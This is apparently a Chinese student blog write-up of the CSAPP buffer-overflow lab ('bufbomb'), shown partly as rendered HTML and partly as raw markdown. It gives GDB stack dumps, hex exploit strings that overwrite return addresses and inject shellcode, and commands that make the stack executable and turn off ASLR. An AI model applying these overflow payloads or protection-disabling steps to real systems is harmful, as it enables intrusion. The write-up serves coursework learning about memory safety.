class=\"number\">0</span>8 \tmovl   $<span class=\"number\">0</span>x80498b8,(%esp)</span><br><span class=\"line\">;  (gdb) p (<span class=\"built_in\">char</span>*) <span class=\"number\">0</span>x80498b8</span><br><span class=\"line\">; $<span class=\"number\">10</span> = <span class=\"number\">0</span>x80498b8 <span class=\"string\">&quot;Sabotaged!: the stack has been corrupted&quot;</span></span><br><span class=\"line\"> <span class=\"number\">8049031</span>:\te8 de f6 ff ff       \tcall   <span class=\"number\">8048714</span> &lt;puts<span class=\"keyword\">@plt</span>&gt;</span><br><span class=\"line\"> <span class=\"number\">8049036</span>:\tc9                   \tleave  </span><br><span class=\"line\"> <span class=\"number\">8049037</span>:\tc3                   \tret    </span><br><span class=\"line\"> <span class=\"number\">8049038</span>:\t<span class=\"number\">3</span>b <span class=\"number\">15</span> cc a1 <span class=\"number\">0</span>4 <span class=\"number\">0</span>8    \tcmp    <span class=\"number\">0</span>x804a1cc,%edx #  <span class=\"number\">0</span>x804a1cc 存储的是cookie字符串 <span class=\"number\">0</span>x2ac98515 对应我的学号</span><br><span class=\"line\"> <span class=\"number\">804903</span>e:\t<span class=\"number\">74</span> <span class=\"number\">12</span>                \tje     <span class=\"number\">8049052</span> &lt;test+<span class=\"number\">0</span>x52&gt;  # 必须相等</span><br><span class=\"line\"> <span class=\"number\">8049040</span>:\t<span class=\"number\">89</span> <span class=\"number\">54</span> <span class=\"number\">24</span> <span class=\"number\">0</span>4          \tmov    %edx,<span class=\"number\">0</span>x4(%esp)</span><br><span class=\"line\"> <span class=\"number\">8049044</span>:\tc7 <span class=\"number\">0</span>4 <span class=\"number\">24</span> <span class=\"number\">9</span>b <span class=\"number\">9</span>a <span class=\"number\">0</span>4 <span class=\"number\">0</span>8 \tmovl   $<span class=\"number\">0</span>x8049a9b,(%esp)</span><br><span class=\"line\">;  (gdb) p (<span class=\"built_in\">char</span>*) <span class=\"number\">0</span>x8049a9b</span><br><span class=\"line\">; $<span class=\"number\">11</span> = <span class=\"number\">0</span>x8049a9b <span class=\"string\">&quot;Dud: getbuf returned 0x%x\\n&quot;</span></span><br><span class=\"line\"> <span class=\"number\">804904</span>b:\te8 <span class=\"number\">14</span> f7 ff ff       \tcall   <span class=\"number\">8048764</span> &lt;printf<span class=\"keyword\">@plt</span>&gt;</span><br><span class=\"line\"> <span class=\"number\">8049050</span>:\tc9                   \tleave  </span><br><span class=\"line\"> <span class=\"number\">8049051</span>:\tc3                   \tret    </span><br><span class=\"line\"> <span class=\"number\">8049052</span>:\t<span class=\"number\">89</span> <span class=\"number\">54</span> <span class=\"number\">24</span> <span class=\"number\">0</span>4          \tmov    %edx,<span class=\"number\">0</span>x4(%esp)</span><br><span class=\"line\"> <span class=\"number\">8049056</span>:\tc7 <span class=\"number\">0</span>4 <span class=\"number\">24</span> <span class=\"number\">7</span>e <span class=\"number\">9</span>a <span class=\"number\">0</span>4 <span class=\"number\">0</span>8 \tmovl   $<span class=\"number\">0</span>x8049a7e,(%esp) #  &lt;- 目标字符串</span><br><span class=\"line\">;  (gdb) p (<span class=\"built_in\">char</span>*) <span class=\"number\">0</span>x8049a7e</span><br><span class=\"line\">; $<span class=\"number\">12</span> = <span class=\"number\">0</span>x8049a7e <span class=\"string\">&quot;Boom!: getbuf returned 0x%x\\n&quot;</span></span><br><span class=\"line\"> <span class=\"number\">804905</span>d:\te8 <span class=\"number\">0</span>2 f7 ff ff       \tcall   <span class=\"number\">8048764</span> &lt;printf<span class=\"keyword\">@plt</span>&gt;</span><br><span class=\"line\"> <span class=\"number\">8049062</span>:\tc7 <span class=\"number\">0</span>4 <span class=\"number\">24</span> <span class=\"number\">0</span>3 <span class=\"number\">0</span>0 <span class=\"number\">0</span>0 <span class=\"number\">0</span>0 \tmovl   $<span class=\"number\">0</span>x3,(%esp)</span><br><span class=\"line\"> <span class=\"number\">8049069</span>:\te8 <span class=\"number\">72</span> fa ff ff       \tcall   <span class=\"number\">8048</span>ae0 &lt;validate&gt;</span><br><span class=\"line\"> <span class=\"number\">804906</span>e:\tc9                   \tleave  </span><br><span class=\"line\"> <span class=\"number\">804906</span>f:\tc3                   \tret </span><br></pre></td></tr></table></figure>\n<p>代码观察：</p>\n<ul>\n<li>地址 <code>8049006</code>：观察到，<code>$0xdeadbeef</code> 存储在 <code>-0x4(%ebp)</code>，此时对应的 <code>%ebp</code> 为: <code>0xffffba78</code>，也就是 <code>$0xdeadbeef</code> 存储在 <code>0xffffba74</code>。</li>\n<li>地址 <code>804901e</code>：<code>%edx</code> 存储 <code>getbuf</code> 返回值</li>\n<li>地址 <code>8049020</code> 到 <code>8049028</code>：将 <code>-0x4(%ebp)</code> 取出来和 <code>$0xdeadbeef</code> 比较。</li>\n<li>地址 <code>8049038</code> 到 <code>804903e</code>：比较 <code>getbuf</code> 返回值和 cookie 是否相等</li>\n</ul>\n<p>我们都知道函数执行结果一般放在 <code>%eax</code>，<code>getbuf</code> 函数也是一样，我们注入的指令，应该要修改 <code>%eax</code> 为我们的 cookie，在 <code>getbuf</code> 压入 test 函数调用时正常返回的位置 <code>0x804901e</code>。在返回到 test 时会使用 <code>%ebp</code>，我们的注入代码不应该动这个值。</p>\n<h3 id=\"方案-1覆盖正确的-ebp\"><a class=\"markdownIt-Anchor\" href=\"#方案-1覆盖正确的-ebp\"></a> 方案 1：覆盖正确的 <code>%ebp</code></h3>\n<p>编写的 <code>level3.s</code> 为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">movl $0x2ac98515,%eax</span><br><span class=\"line\">movl $0x804901e,(%rsp)</span><br><span class=\"line\">ret</span><br></pre></td></tr></table></figure>\n<p>得到的反汇编文件：</p>\n<figure class=\"highlight d\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">level3.o:     file format elf64-x86-<span class=\"number\">64</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">Disassembly of section .text:</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0</span>000000000000000 &lt;.text&gt;:</span><br><span class=\"line\">   <span class=\"number\">0</span>:\tb8 <span class=\"number\">15</span> <span class=\"number\">85</span> c9 <span class=\"number\">2</span>a       \tmov    $<span class=\"number\">0</span>x2ac98515,%eax</span><br><span class=\"line\">   <span class=\"number\">5</span>:\tc7 <span class=\"number\">0</span>4 <span class=\"number\">24</span> <span class=\"number\">1</span>e <span class=\"number\">90</span> <span class=\"number\">0</span>4 <span class=\"number\">0</span>8 \tmovl   $<span class=\"number\">0</span>x804901e,(%rsp)</span><br><span class=\"line\">   c:\tc3                   \tretq   </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>编写指令做两件事：</p>\n<ol>\n<li>修改 <code>getbuf</code> 的返回值</li>\n<li>跳转到 <code>test</code> 正确的位置</li>\n</ol>\n<p>答案：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 答案 1 </span><br><span class=\"line\">41 42 43 44 45 46 47 48 49 4a 4b 4c 🔹78 ba ff ff🔹 ❤60 ba ff ff❤ ☢b8 15 85 c9 2a c7 04 24 1e 90 04 08 c3☢</span><br></pre></td></tr></table></figure>\n<p>❤标记了指令执行地址，☢标记了注入的指令，🔹标记了覆盖的 <code>%ebp</code>：<code>0xffffba78</code></p>\n<h2 id=\"方案-2指令修改为正确的-ebp\"><a class=\"markdownIt-Anchor\" href=\"#方案-2指令修改为正确的-ebp\"></a> 方案 2：指令修改为正确的 <code>%ebp</code></h2>\n<p>另外一种答案为在指令中修改正确的 <code>%ebp</code> 的值也是可以的，两者实现的效果是一样的。</p>\n<p>编写的 <code>level3.s</code> 为：</p>\n<figure class=\"highlight d\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">movl $<span class=\"number\">0</span>x2ac98515,%eax</span><br><span class=\"line\">movl $<span class=\"number\">0</span>x804901e,(%rsp)</span><br><span class=\"line\">movl $<span class=\"number\">0</span>xffffba78,%ebp</span><br><span class=\"line\">ret</span><br></pre></td></tr></table></figure>\n<p>反汇编结果：</p>\n<figure class=\"highlight d\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">level3.o:     file format elf64-x86-<span class=\"number\">64</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">Disassembly of section .text:</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0</span>000000000000000 &lt;.text&gt;:</span><br><span class=\"line\">   <span class=\"number\">0</span>:\tb8 <span class=\"number\">15</span> <span class=\"number\">85</span> c9 <span class=\"number\">2</span>a       \tmov    $<span class=\"number\">0</span>x2ac98515,%eax</span><br><span class=\"line\">   <span class=\"number\">5</span>:\tc7 <span class=\"number\">0</span>4 <span class=\"number\">24</span> <span class=\"number\">1</span>e <span class=\"number\">90</span> <span class=\"number\">0</span>4 <span class=\"number\">0</span>8 \tmovl   $<span class=\"number\">0</span>x804901e,(%rsp)</span><br><span class=\"line\">   c:\tbd <span class=\"number\">78</span> ba ff ff       \tmov    $<span class=\"number\">0</span>xffffba78,%ebp</span><br><span class=\"line\">  <span class=\"number\">11</span>:\tc3                   \tretq   </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>答案文件 <code>exploit3.txt</code> 为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 答案 2 。其中 zz zz zz zz 为任意十六进制数</span><br><span class=\"line\">41 42 43 44 45 46 47 48 49 4a 4b 4c 🔹zz zz zz zz🔹 ❤60 ba ff ff❤ ☢b8 15 85 c9 2a c7 04 24 1e 90 04 08 ◾bd 78 ba ff ff◾ c3☢</span><br></pre></td></tr></table></figure>\n<p>◾标记了新增的指令。</p>\n<p>最终 <code>bufbomb</code> 程序结果为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Type string:Boom!: getbuf returned 0x2ac98515</span><br></pre></td></tr></table></figure>\n<h1 id=\"本文参考\"><a class=\"markdownIt-Anchor\" href=\"#本文参考\"></a> 本文参考</h1>\n<ul>\n<li><a href=\"https://blog.csdn.net/yasi_xi/article/details/9263955\">gdb中看内存(x命令)_gdb 查看内存x-CSDN博客</a></li>\n<li><a href=\"https://blog.csdn.net/a523442148/article/details/101253155\">修改程序堆栈的可执行属性-CSDN博客</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/629686088\">CSAPP课程Lab3 attack - 知乎 (zhihu.com)</a></li>\n</ul>\n","raw":"---\ntitle: CSAPP LAB-3 缓冲区溢出炸弹\ntags:\n  - CSAPP\n  - C\n  - ASM\n  - GDB\n  - objdump\ncover: https://cdn.gallery.uuanqin.top/img/202501232353097.webp\ndescription: 缓冲区溢出攻击实验\ncategories:\n  - CSAPP LABS\nabbrlink: '67787353'\ndate: 2024-05-26 15:38:09\ntop_img:\n---\n\n我发现我做的实验 3 和网上的都不太一样，难道这实验有新老版本之分？不过主题都是一致的：利用缓冲区溢出的漏洞进行攻击。\n\n> [!notice] CSAPP LAB 实验\n>\n> - [[CSAPP LAB-1 位操作]]\n> - [[CSAPP LAB-2 二进制炸弹实验]]\n> - CSAPP LAB-3 缓冲区溢出炸弹（本文）\n> - [[CSAPP LAB-4 代码优化]]\n> - [[CSAPP LAB-5 手写动态存储分配器]]\n\n如果你曾经做过 Lab2，那么阅读汇编代码将会很轻松。\n\n# 实验简介\n\n名称：缓冲区溢出炸弹\n\n实验代码：\n\n- `makecookie`：生成 cookie，后续实验用到，以判断实验是否成功。例：`./makecookie SA18225155` 生成 cookie\n- `bufbomb`：可执行程序 - 攻击对象\n- `sendstring`: 字符格式转换\n\n## bufbomb 程序\n\n`bufbomb` 中包含一个 `getbuf` 函数，该函数实现如下：\n\n```c\nint getbuf() \n{ \n \tchar buf[12]; \n\tGets(buf); \n\treturn 1; \n}\n```\n\n可以发现，这个函数对 buf 没有越界检查（这是常见的 c 编程错误），当输入超过 11 个字符将溢出。溢出的字符将覆盖栈帧上的数据，特别的，会覆盖程序调用的返回地址。这赋予我们控制程序流程的能力，我们可以通过构造溢出字符串，程序将“返回”至我们想要的代码上。\n\n执行以下命令进行反汇编：\n\n```sh\nobjdump -d bufbomb > bufbomb.s\n```\n\n观察汇编代码，结合栈帧结构进行理解：\n\n```d\n08048fe0 <getbuf>:\n 8048fe0:\t55                   \tpush   %ebp         \n 8048fe1:\t89 e5                \tmov    %esp,%ebp\n 8048fe3:\t83 ec 18             \tsub    $0x18,%esp       # 缓冲区分配\n 8048fe6:\t8d 45 f4             \tlea    -0xc(%ebp),%eax  # 请注意这一行\n 8048fe9:\t89 04 24             \tmov    %eax,(%esp)\n 8048fec:\te8 6f fe ff ff       \tcall   8048e60 <Gets>\n 8048ff1:\tb8 01 00 00 00       \tmov    $0x1,%eax\n 8048ff6:\tc9                   \tleave  \n 8048ff7:\tc3                   \tret    \n 8048ff8:\t90                   \tnop\n 8048ff9:\t8d b4 26 00 00 00 00 \tlea    0x0(%esi,%eiz,1),%esi\n```\n\n![image.png|300](https://cdn.gallery.uuanqin.top/img/20240526154709.webp)\n\n## sendstring 字符串转换程序\n\n它的功能是将 16 进制的数据转换为 ASCII 字符串。比如：`41 42 43` 转换为 `ABC`。\n\n因为 `bufbomb` 接收的参数是 ASCII 字符串，我们输入的字符串使用了扩展的 ASCII 码（128~255）难以直接输入。\n\n所以实验的基本流程为：\n\n- 在一个文件，如 `exploit.txt` 写好十六进制数据\n- 执行命令得到字符文件：`./sendstring < exploit.txt > exploit-raw.txt `\n- 运行 bufbomb 程序：`bufbomb -t <your_number> < exploit-raw.txt`。`<your_number>` 填写你的学号以验证 cookie。\n\n当然，我们也可以通过手动输入（从标准输入设备输入）的方式：<kbd>ALT</kbd>+ASC 码的十进制数（小键盘输入）。注意，最后一个数字按下后与 ALT 键同时放开。例如输入字符“1”为 ALT+49\n\n> 我感觉我们的实验时阉割版，不启用评分系统。和 Lab2 不一样的是，bufbomb 是运行 1 次解开对应 Level。如果有 4 个 Level 我们可能需要写 4 个 exploit.txt。但不管怎样，基本思路是一致的。\n\n## GDB\n\nGDB 的使用详见：[[CSAPP LAB-2 二进制炸弹实验]]。这里新学一个命令：`examine` 查看内存地址中的值（简写为 `x`）。`x` 命令的语法如下所示：\n\n`x/<n/f/u> <addr>`\n\n`n`、`f`、`u` 是可选的参数：\n\n- `n` 是一个正整数，表示显示内存的长度，也就是说从当前地址向后显示几个地址的内容。\n- `f` 表示显示的格式，参见上面。如果地址所指的是字符串，那么格式可以是 `s`，如果 地址是指令地址，那么格式可以是 i。\n- `u` 表示从当前地址往后请求的字节数，如果不指定的话，GDB 默认是 4 个 bytes。`u` 参数可以用下面的字符来代替：`b` 表示单字节，`h` 表示双字节，`w` 表示四字 节，`g` 表示八字节。当我们指定了字节长度后，GDB 会从指内存定的内存地址开始，读写指定字节，并把其当作一个值取出来。\n\n例子：\n\n```d\n(gdb) x/48xb $ebp\n0xffffba40:     0x4c    0xba    0xff    0xff    0x74    0x2b    0xdf    0xf7\n0xffffba48:     0x0b    0x38    0xe3    0xf7    0x41    0x42    0x43    0x44\n0xffffba50:     0x45    0x46    0x47    0x48    0x49    0x4a    0x4b    0x00\n0xffffba58:     0x78    0xba    0xff    0xff    0x1e    0x90    0x04    0x08\n0xffffba60:     0x03    0x00    0x00    0x00    0xc7    0x9a    0x04    0x08\n0xffffba68:     0x84    0xba    0xff    0xff    0x60    0x90    0xf2    0xf7\n```\n\n## 一些汇编指令参考\n\n不一定全都用到：\n\n- `call 地址`：返回地址入栈（等价于 `push %eip；mov 地址，%eip`；注意 `eip` 指向下一条尚未执行的指令）\n- `ret`：从栈中弹出地址，并跳到那个地址（pop %eip）\n- `leave`：使栈做好返回准备，等价于 `mov %ebp, %esp; pop %ebp`\n- `push`：`R[%esp]<--R[%esp]-4;  M[R[%esp]]<--S`\n- `pop`:  `D<--M[R[%esp]];   R[%esp]<--R[%esp]+4;`\n\n# 实验开始\n\n## Level 0 - 蜡烛\n\n> 本层考察地址跳转。\n\n炸弹的主体函数 `test` 为：\n\n```c\nvoid test() \n{ \n\tint val; \n\tvolatile int local = 0xdeadbeef; \n\tentry_check(3); /* Make sure entered this function properly */ \n\tval = getbuf(); // getbuf函数在test中被调用，当getbuf返回时继续执行后续内容\n\t/* Check for corrupted stack */ \n\tif (local != 0xdeadbeef) { \n\t\tprintf(\"Sabotaged!: the stack has been corrupted\\n\"); \n\t} \n\telse if (val == cookie) { \n\t\t...\t\n}\n```\n\n正常运行的结果为：\n\n```\nType string: <随便输入小于11个字符的字符串>\nBetter luck next time\n```\n\n `smoke` 是 `bufbomb` 中一个正常情况下不会被执行的函数：\n\n```c\nvoid smoke() \n{ \n\tentry_check(0); /* Make sure entered this function properly */ \n\tprintf(\"Smoke!: You called smoke()\\n\"); \n\tvalidate(0); \n\texit(0); \n} \n```\n\n我们的目标：在 `getbuf` 返回时跳到 `smoke` 函数执行。\n\n思路：\n\n- 通过调试得到我们输入的字符串首地址，并打印出该字符串作验证 `x/s $ebp-0xc`\n- 找到函数 `smoke` 的地址 `p/x &smoke`；或者直接在反编译文件中搜索 `smoke` 函数地址即可。\n- 用 `smoke` 函数的地址覆盖 `getbuf` 的返回地址。\n\n我们先简单测试一个不会造成缓冲区溢出的正常字符串：`41 42 43 44 45 46 47 48 49 4a 4b` 11 个字符加上末尾 `\\0`。\n\nGDB 调试，在 getbuf 函数返回前，检查%esp：\n\n```d\n; (gdb) p /x $esp\n; $2 = 0xffffba40  ⏩\n\n(gdb) p /x $ebp\n$9 = 0xffffba58  ▶ \n\n; (gdb) x/48xb $esp\n; 0xffffba40:⏩  0x4c    0xba    0xff    0xff    0x74    0x2b    0xdf    0xf7\n; 0xffffba48:     0x0b    0x38    0xe3    0xf7    😀0x41    0x42    0x43    0x44\n; 0xffffba50:     0x45    0x46    0x47    0x48    0x49    0x4a    0x4b    0x00😉\n; 0xffffba58:▶  0x78    0xba    0xff    0xff    ❤0x1e    0x90    0x04    0x08❤ \n; 0xffffba60:     0x03    0x00    0x00    0x00    0xc7    0x9a    0x04    0x08\n; 0xffffba68:     0x84    0xba    0xff    0xff    0x60    0x90    0xf2    0xf7\n```\n\n😀标记处，也就是汇编代码中的 `-0xc(%ebp)` 就是缓冲区开始地址。😉标记缓冲区结束的位置。\n\n❤标记的 `0x1e    0x90    0x04    0x08` 是地址 `0x0804901e` 小端编码后的结果，指向返回 test 地址（因为 test 调用 getbuf）。\n\n那我们利用缓冲区溢出取覆盖掉这个地址就行，让他指向 smoke 函数。观察反汇编的代码 `bufbomb.s` 容易知道 smoke 函数地址为：`0x08048e20`，小端写法：`20 8e 04 08`。所以，`exploit0.txt` 为：\n\n```txt\n41 42 43 44 45 46 47 48 49 4a 4b 4c ff ff ff ff 20 8e 04 08\n```\n\ngdb 重新运行 bufbomb 我们可以观察注入后的栈帧：\n\n```d\n; 注入后：\n; (gdb) x/48xb $esp\n; 0xffffba40:⏩  0x4c    0xba    0xff    0xff    0x74    0x2b    0xdf    0xf7\n; 0xffffba48:     0x0b    0x38    0xe3    0xf7    😀0x41    0x42    0x43    0x44\n; 0xffffba50:     0x45    0x46    0x47    0x48    0x49    0x4a    0x4b    0x4c\n; 0xffffba58:▶  0xff    0xff    0xff    0xff    ❤0x20    0x8e    0x04    0x08❤\n; 0xffffba60:     0x00    0x00    0x00    0x00    0xc7    0x9a    0x04    0x08\n; 0xffffba68:     0x84    0xba    0xff    0xff    0x60    0x90    0xf2    0xf7\n```\n\n运行结果如下：\n\n```\nType string:Smoke!: You called smoke()\n```\n\n\n## Level 1 - 烟火\n\n> 本层考察函数传参。\n\nbufbomb 存在另一个函数 fizz：\n\n```c\nvoid fizz(int val) \n{ \n\tentry_check(1); /* Make sure entered this function properly */ \nif (val == cookie) { \n\tprintf(\"Fizz!: You called fizz(0x%x)\\n\", val);  // 我们必须运行到这里\n\tvalidate(1); \n} else \n\tprintf(\"Misfire: You called fizz(0x%x)\\n\", val); \n\texit(0); \n} \n```\n\n目标：“返回”到该函数并传送参数 cookie。Cookie 为上文提到的 `makecookie` 程序结合自己学号生成 `./makecookie SA08225155`。\n\nfizz  的地址为  `0x08048dc0`，小端写法：`c0 8d 04 08`。所以参照 Level 0，得到 exploit 的基本写法为：\n\n```\n41 42 43 44 45 46 47 48 49 4a 4b 4c ff ff ff ff c0 8d 04 08\n```\n\n继续阅读反汇编代码：\n\n```d\n08048dc0 <fizz>:\n 8048dc0:\t55                   \tpush   %ebp\n 8048dc1:\t89 e5                \tmov    %esp,%ebp\n 8048dc3:\t53                   \tpush   %ebx\n 8048dc4:\t83 ec 14             \tsub    $0x14,%esp\n 8048dc7:\t8b 5d 08             \tmov    0x8(%ebp),%ebx      #  不要看错为-0x8(%ebp)\n # 0x8(%ebp)  0x8049ac7 -> \n;  (gdb) p (char*) 0x8049ac7\n; $99 = 0x8049ac7 \"Type string:\"\n 8048dca:\tc7 04 24 01 00 00 00 \tmovl   $0x1,(%esp)\n 8048dd1:\te8 ca fb ff ff       \tcall   80489a0 <entry_check>\n 8048dd6:\t3b 1d cc a1 04 08    \tcmp    0x804a1cc,%ebx      #  0x804a1cc 存储的是cookie字符串 0x2ac98515 对应我的学号\n 8048ddc:\t74 22                \tje     8048e00 <fizz+0x40>  # 要想成功，必须相等\n 8048dde:\t89 5c 24 04          \tmov    %ebx,0x4(%esp)\n 8048de2:\tc7 04 24 98 98 04 08 \tmovl   $0x8049898,(%esp)    # 传入字符串：\"Misfire: You called fizz(0x%x)\\n\"\n;  (gdb) p (char*) 0x8049898\n; $53 = 0x8049898 \"Misfire: You called fizz(0x%x)\\n\"  \n 8048de9:\te8 76 f9 ff ff       \tcall   8048764 <printf@plt>\n\n 8048dee:\tc7 04 24 00 00 00 00 \tmovl   $0x0,(%esp)\n 8048df5:\te8 aa f9 ff ff       \tcall   80487a4 <exit@plt>\n 8048dfa:\t8d b6 00 00 00 00    \tlea    0x0(%esi),%esi\n\n 8048e00:\t89 5c 24 04          \tmov    %ebx,0x4(%esp)\n 8048e04:\tc7 04 24 29 9a 04 08 \tmovl   $0x8049a29,(%esp) # 传入字符串\" Fizz!: You called fizz(0x%x)\\n\"\n;  (gdb) p (char*) 0x8049a29\n; $54 = 0x8049a29 \"Fizz!: You called fizz(0x%x)\\n\" <- 这个才是成功的\n 8048e0b:\te8 54 f9 ff ff       \tcall   8048764 <printf@plt>\n 8048e10:\tc7 04 24 01 00 00 00 \tmovl   $0x1,(%esp)\n 8048e17:\te8 c4 fc ff ff       \tcall   8048ae0 <validate>\n 8048e1c:\teb d0                \tjmp    8048dee <fizz+0x2e>\n 8048e1e:\t89 f6                \tmov    %esi,%esi\n```\n\n我们知道，要想成功，必须在跳转到 `fizz` 函数后，传入参数（参数值为自己的 cookie）。这个参数保存在 `0x8(%ebp)` 中。老方法，直接覆盖即可：\n\n```\n41 42 43 44 45 46 47 48 49 4a 4b 4c ff ff ff ff c0 8d 04 08 ee ee ee ee 15 85 c9 2a\n```\n\n```d\n(gdb) p /x $esp\n$1 = 0xffffba44\n\n(gdb) p /x $ebp\n$2 = 0xffffba5c\n\n(gdb) x/60xb $esp\n0xffffba44:⏩  0x74    0x2b    0xdf    0xf7    0x0b    0x38    0xe3    0xf7\n0xffffba4c:     0x41    0x42    0x43    0x44    0x45    0x46    0x47    0x48\n0xffffba54:     0x49    0x4a    0x4b    0x4c    0x00    0x00    0x00    0x00\n0xffffba5c:▶   0xff    0xff    0xff    0xff    0xee    0xee    0xee    0xee\n0xffffba64:     ❤0x15    0x85    0xc9    0x2a❤    0x00    0xba    0xff    0xff\n0xffffba6c:     0x60    0x90    0xf2    0xf7    0x86    0x91    0xf2    0xf7\n0xffffba74:     0xef    0xbe    0xad    0xde    0x98    0xcc    0xff    0xff\n0xffffba7c:     0x05    0x91    0x04    0x08\n```\n\n运行结果如下：\n\n```\nType string:Fizz!: You called fizz(0x2ac98515)\n```\n\n## Level 2 - 鞭炮【选做】\n\n> 本层考察指令注入。\n\n这一层我们需要跳转到另一个函数：\n\n```c\nint global_value = 0; \nvoid bang(int val) \n{ \n\tentry_check(2); /* Make sure entered this function properly */ \n\tif (global_value == cookie) { \n\t\tprintf(\"Bang!: You set global_value to 0x%x\\n\", global_value); // 必须执行到这里\n\t\tvalidate(2); \n\t} else \n\t\tprintf(\"Misfire: global_value = 0x%x\\n\", global_value); \n\texit(0); \n}\n```\n\n与上一层的不同点在于这个函数检查的是全局变量，全局变量存储在一个特定的地址中。\n\n观察反汇编后的代码：\n\n```d\n08048d60 <bang>:\n 8048d60:\t55                   \tpush   %ebp\n 8048d61:\t89 e5                \tmov    %esp,%ebp\n 8048d63:\t83 ec 08             \tsub    $0x8,%esp\n 8048d66:\tc7 04 24 02 00 00 00 \tmovl   $0x2,(%esp)\n 8048d6d:\te8 2e fc ff ff       \tcall   80489a0 <entry_check>\n 8048d72:\ta1 dc a1 04 08       \tmov    0x804a1dc,%eax   # 全局变量存放地址（我们需要修改）\n;  (gdb) p /x *0x804a1dc\n; $5 = 0x0\n 8048d77:\t3b 05 cc a1 04 08    \tcmp    0x804a1cc,%eax   # cookie存放地址\n;  (gdb) p /x *0x804a1cc\n; $6 = 0x2ac98515 \n 8048d7d:\t74 21                \tje     8048da0 <bang+0x40>\n 8048d7f:\t89 44 24 04          \tmov    %eax,0x4(%esp)\n 8048d83:\tc7 04 24 0b 9a 04 08 \tmovl   $0x8049a0b,(%esp)\n 8048d8a:\te8 d5 f9 ff ff       \tcall   8048764 <printf@plt>\n 8048d8f:\tc7 04 24 00 00 00 00 \tmovl   $0x0,(%esp)\n 8048d96:\te8 09 fa ff ff       \tcall   80487a4 <exit@plt>\n 8048d9b:\t90                   \tnop\n 8048d9c:\t8d 74 26 00          \tlea    0x0(%esi,%eiz,1),%esi\n 8048da0:\t89 44 24 04          \tmov    %eax,0x4(%esp)\n 8048da4:\tc7 04 24 70 98 04 08 \tmovl   $0x8049870,(%esp)\n 8048dab:\te8 b4 f9 ff ff       \tcall   8048764 <printf@plt>\n 8048db0:\tc7 04 24 02 00 00 00 \tmovl   $0x2,(%esp)\n 8048db7:\te8 24 fd ff ff       \tcall   8048ae0 <validate>\n 8048dbc:\teb d1                \tjmp    8048d8f <bang+0x2f>\n 8048dbe:\t89 f6                \tmov    %esi,%esi\n```\n\n程序取全局变量的地址为 `0x804a1dc`，这个地址初始值为 0。程序计算好的 cookie 放在 `0x804a1cc`，会和全局变量进行比较。我们的任务是实现修改全局变量，我们这时候就需要构造指令，注入代码了。\n\n构造指令的步骤：\n\n1. 写一小段汇编程序 `level2.s`\n2. 编译：`gcc -c level2.s `\n3. 反汇编得到字节码：`objdump -d level2.o > level2.d`\n\n这段代码如何执行？前面两个实验已经实现了跳转到某个函数地址执行代码，我们可以使其跳转到缓冲区中，执行我们注入的指令。\n\n但是在默认的情况下，栈中的内容不可执行（课本好像讲过相关内容），我们需要使用工具 `execstack` 接触栈执行的限制：\n\n```sh\nsudo apt-get install execstack # 安装 execstack\nexecstack -s bufbomb                  # 亲测，GDB做到这一步就行\nsysctl -w kernel.randomize_va_space=0 # 关闭ASLR（地址空间随机化）命令\n```\n\n> 如果不解除限制，后续实验可能会报段错误。\n\n下面编写 `level2.s`：\n\n```d\nmovl $0x2ac98515,0x804a1dc\nmovl $0x08048d60,(%rsp)\nret\n\n```\n\n> 注意汇编代码文件末尾有空行，否则有警告：warning: end of file not at end of a line; newline inserted\n\n上面的汇编代码做了几件事情：\n\n1. 把 cookie 放入全局变量（`0x804a1dc`）中\n2. 把 bang 的函数地址压栈\n3. 返回。（弹栈跳转到指定地址）\n\n使用反汇编工具得到的字节码如下：\n\n```d\n\nlevel2.o:     file format elf64-x86-64\n\n\nDisassembly of section .text:\n\n0000000000000000 <.text>:\n   0:\tc7 04 25 dc a1 04 08 \tmovl   $0x2ac98515,0x804a1dc\n   7:\t15 85 c9 2a \n   b:\tc7 04 24 60 8d 04 08 \tmovl   $0x8048d60,(%rsp)\n  12:\tc3                   \tretq   \n\n```\n\n因此我们的指令字节为：`c7 04 25 dc a1 04 08 15 85 c9 2a c7 04 24 60 8d 04 08 c3`\n\n这里先给出本层答案，然后看下面的说明就能理解：\n\n```\n41 42 43 44 45 46 47 48 49 4a 4b 4c ff ff ff ff 60 ba ff ff c7 04 25 dc a1 04 08 15 85 c9 2a c7 04 24 60 8d 04 08 c3 \n```\n\n执行 `getbuff` 函数结束前，我们需要看一下栈的地址以便确定跳转到哪里：\n\n```d\n(gdb) p /x $esp\n$1 = 